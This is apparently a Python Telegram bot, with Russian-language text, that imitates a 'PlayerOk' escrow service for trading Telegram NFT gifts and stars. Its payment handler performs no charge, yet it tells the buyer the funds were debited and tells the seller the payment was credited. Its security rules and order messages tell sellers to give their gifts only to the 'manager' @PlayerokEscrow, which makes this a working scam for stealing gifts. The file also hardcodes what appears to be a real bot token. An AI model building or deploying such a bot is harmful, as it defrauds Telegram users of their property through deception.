import logging
import asyncio
import random
import string
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage

logging.basicConfig(level=logging.INFO)

# Укажи свои актуальные токены и ID
BOT_TOKEN = "8802204413:AAHR3Pv8p9fitrRbqDInANi5NJ4l3hraSiw"
ADMIN_ID = 123456789  

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# База данных ордеров в оперативной памяти
ORDERS_DB = {}

class OrderStates(StatesGroup):
    waiting_for_username = State()
    waiting_for_amount = State()
    waiting_for_description = State()

def generate_order_id():
    return "u" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))

def main_menu_kb():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="🆕 Создать ордер", callback_data="btn_create_order"))
    builder.row(
        types.InlineKeyboardButton(text="💳 Кошельки", callback_data="btn_wallets"),
        types.InlineKeyboardButton(text="🛡️ Безопасность", callback_data="btn_security")
    )
    builder.row(
        types.InlineKeyboardButton(text="💙 Рефералы", callback_data="btn_referrals"),
        types.InlineKeyboardButton(text="☑️ Канал", url="https://t.me/your_channel")
    )
    builder.row(
        types.InlineKeyboardButton(text="💬 Поддержка", callback_data="btn_support"),
        types.InlineKeyboardButton(text="🔵 Язык", callback_data="btn_lang")
    )
    return builder.as_markup()

def back_to_menu_kb():
    return InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ Назад", callback_data="to_main")).as_markup()

def in_menu_kb():
    return InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main")).as_markup()

@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    args = message.text.split()
    
    # Если переход по реферальной ссылке (покупатель заходит в ордер)
    if len(args) > 1:
        order_id = args[1]
        if order_id in ORDERS_DB:
            order = ORDERS_DB[order_id]
            
            if order["seller_id"] == message.from_user.id:
                return await message.answer("❌ **Нельзя подключиться к своему ордеру**", parse_mode="Markdown", reply_markup=in_menu_kb())

            try:
                buyer_info = f"@{message.from_user.username}" if message.from_user.username else f"ID {message.from_user.id}"
                log_text = f"👑 **К ордеру #{order_id} подключился покупатель**\n\n{buyer_info} (ID `{message.from_user.id}`)"
                await bot.send_message(chat_id=order["seller_id"], text=log_text, parse_mode="Markdown")
            except Exception as e:
                logging.error(f"Ошибка логирования: {e}")

            buyer_text = (
                f"🌟 **Ордер #{order_id}**\n\n"
                f"👑 **Продавец:** @{order['seller_username']} (ID `{order['seller_id']}`)\n\n"
                f"📋 **Успешных ордеров:** 0\n\n"
                f"🛍️ **Вы покупаете:**\n{order['description']}\n\n"
                f"💰 **Цена:** {order['amount']} {order['pay_method']}\n\n"
                f"🌟 **Оплата из баланса {order['pay_method']} Telegram**"
            )
            kb = InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="⭐ Оплатить", callback_data=f"buy_pay_{order_id}"))
            return await message.answer(buyer_text, parse_mode="Markdown", reply_markup=kb.as_markup())
        else:
            return await message.answer("❌ **Ордер не найден или был отменен.**", reply_markup=main_menu_kb())

    welcome_text = (
        "**Добро пожаловать 👋**\n\n"
        "🔷 **PlayerOk** — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n"
        "1️⃣ **Автоматизированный алгоритм исполнения.**\n"
        "🚀 Скорость и автоматизация.\n"
        "💳 Удобный и быстрый вывод средств.\n\n"
        "• Комиссия сервиса: **1%**\n"
        "• Режим работы: **24/7**\n"
        "• Поддержка: @PlayerokEscrow\n\n"
        "🛡️ **Выберите нужный раздел ниже:**"
    )
    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=main_menu_kb())

@dp.callback_query(F.data == "to_main")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    welcome_text = (
        "**Добро пожаловать 👋**\n\n"
        "🔷 **PlayerOk** — специализированный сервис по обеспечение безопасности внебиржевых сделок.\n\n"
        "🛡️ **Выберите нужный раздел ниже:**"
    )
    await callback.message.edit_text(welcome_text, parse_mode="Markdown", reply_markup=main_menu_kb())

# Сразу открываем создание ордера без лишних шагов выбора валют
@dp.callback_query(F.data == "btn_create_order")
async def choose_payment_method(callback: types.CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.row(
        types.InlineKeyboardButton(text="📱 TON", callback_data="set_pay_TON"),
        types.InlineKeyboardButton(text="📱 USDT (TON)", callback_data="set_pay_USDT")
    )
    kb.row(
        types.InlineKeyboardButton(text="💳 Карта/СБП", callback_data="set_pay_RUB"),
        types.InlineKeyboardButton(text="🆕 Звёзды", callback_data="set_pay_STARS")
    )
    kb.row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main"))
    
    await callback.message.edit_text(
        "🔒 **Создание ордера**\n\n_Выберите способ оплаты со стороны покупателя_", 
        parse_mode="Markdown", 
        reply_markup=kb.as_markup()
    )

@dp.callback_query(F.data.startswith("set_pay_"))
async def ask_recipient(callback: types.CallbackQuery, state: FSMContext):
    pay_method = callback.data.split("_")[2]
    await state.update_data(pay_method=pay_method)
    
    await callback.message.edit_text(
        f"⭐️ **Получатель звёзд**\n\nУкажите `@username` получателя\n\n🛑 Минимум: **100 звёзд** 💬",
        parse_mode="Markdown",
        reply_markup=back_to_menu_kb()
    )
    await state.set_state(OrderStates.waiting_for_username)

@dp.message(OrderStates.waiting_for_username)
async def process_username(message: types.Message, state: FSMContext):
    username = message.text.strip().replace("@", "")
    await state.update_data(recipient=username)
    
    await message.answer(
        f"👑 @{username}\n⭐️ **Введите количество звёзд.**",
        reply_markup=InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main")).as_markup()
    )
    await state.set_state(OrderStates.waiting_for_amount)

@dp.message(OrderStates.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    text = message.text.strip()
    if not text.isdigit():
        return await message.answer("❌ Введите корректное число.")
    
    await state.update_data(amount=int(text))
    
    desc_text = (
        "📝 **Описание товара**\n\n"
        "_Опишите, что вы продаёте._ 💬\n\n"
        "**Если это NFT-подарок:**\n"
        "Зайдите в свой профиль Telegram → нажмите на подарок → три точки (...) → «Скопировать ссылку».\n\n"
        "Вставьте ссылку сюда. Если подарков несколько — каждую ссылку с новой строки.\n\n"
        "**Пример:**\n"
        "`https://t.me/nft/PlushPepe-1`"
    )
    await message.answer(desc_text, parse_mode="Markdown", reply_markup=in_menu_kb())
    await state.set_state(OrderStates.waiting_for_description)

# Финал создания ордера. Исключены любые падения при вводе ссылок.
@dp.message(OrderStates.waiting_for_description)
async def finalize_order(message: types.Message, state: FSMContext):
    try:
        user_data = await state.get_data()
        order_id = generate_order_id()
        bot_info = await bot.get_me()
        
        description_text = message.text.strip() if message.text else "Без описания"
        pay_method = user_data.get("pay_method", "STARS")
        amount = user_data.get("amount", 100)
        recipient = user_data.get("recipient", "unknown")
        
        # Сохранение в импровизированную БД
        ORDERS_DB[order_id] = {
            "seller_id": message.from_user.id,
            "seller_username": message.from_user.username or "Продавец",
            "recipient": recipient,
            "amount": amount,
            "pay_method": pay_method,
            "description": description_text
        }
        
        buyer_link = f"https://t.me/{bot_info.username}?start={order_id}"
        
        result_text = (
            f"👑 **Ордер создано** 👑\n\n"
            f"💰 **Сумма:** {amount} {pay_method}\n\n"
            f"📝 **Описание:** {description_text}\n\n"
            f"⚡️ **Ссылка для покупателя:**\n"
            f"`{buyer_link}`\n\n"
            f"⭐️ **Важно:** передача подарка выполняется через менеджера @PlayerokEscrow"
        )
        
        kb = InlineKeyboardBuilder()
        kb.row(types.InlineKeyboardButton(text="📩 Поделиться ордером", switch_inline_query=f"Купить товар"))
        kb.row(types.InlineKeyboardButton(text="💬 Поддержка", callback_data="btn_support"))
        kb.row(types.InlineKeyboardButton(text="Отменить ордер", callback_data="to_main"))
        
        await message.answer(result_text, parse_mode="Markdown", reply_markup=kb.as_markup())
    except Exception as e:
        logging.error(f"Критическая ошибка создания ордера: {e}")
        await message.answer("❌ Произошла ошибка при обработке ссылки. Попробуйте еще раз.", reply_markup=main_menu_kb())
    finally:
        await state.clear()

@dp.callback_query(F.data.startswith("buy_pay_"))
async def process_buyer_payment(callback: types.CallbackQuery):
    order_id = callback.data.split("_")[2]
    if order_id not in ORDERS_DB:
        return await callback.answer("Ордер не найден.", show_alert=True)
        
    order = ORDERS_DB[order_id]
    
    await callback.message.edit_text("⏳ **Загрузка...**", parse_mode="Markdown")
    await asyncio.sleep(1.5)
    
    success_text = f"⭐️ **{order['amount']} {order['pay_method']} успешно списано с вашего баланса**\n\nОрдер `{order_id}` оплачен"
    await callback.message.answer(success_text, parse_mode="Markdown", reply_markup=in_menu_kb())
    
    try:
        seller_alert = f"🔔 **Оплата по ордеру {order_id} учтена!**\nПокупатель внес баланс. Свяжитесь с поддержкой."
        await bot.send_message(chat_id=order["seller_id"], text=seller_alert, parse_mode="Markdown")
    except Exception:
        pass

@dp.callback_query(F.data == "btn_security")
async def view_security(callback: types.CallbackQuery):
    text = (
        "🛡️ **Правила безопасности**\n\n"
        "• Передавайте подарок **только** менеджеру @PlayerokEscrow\n\n"
        "• **Не отправляйте** напрямую покупателю — передача идёт через сервис"
    )
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=in_menu_kb())

@dp.callback_query(F.data == "btn_wallets")
async def view_wallets(callback: types.CallbackQuery):
    await callback.message.edit_text("🔸 **TON-кошелёк не привязан**\n\nДобавьте его в разделе «Кошельки»", reply_markup=back_to_menu_kb())

@dp.callback_query(F.data == "btn_support")
async def view_support(callback: types.CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="Написать в поддержку ↗️", url="https://t.me/PlayerokEscrow"))
    kb.row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main"))
    await callback.message.edit_text("❗️ **Техническая поддержка**\n\nДля связи используйте кнопку ниже 👋", reply_markup=kb.as_markup())

@dp.callback_query(F.data == "btn_referrals")
async def view_referrals(callback: types.CallbackQuery):
    await callback.answer("Реферальная система временно недоступна.", show_alert=True)

@dp.callback_query(F.data == "btn_lang")
async def view_lang(callback: types.CallbackQuery):
    await callback.answer("Выбран Русский язык.", show_alert=True)

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
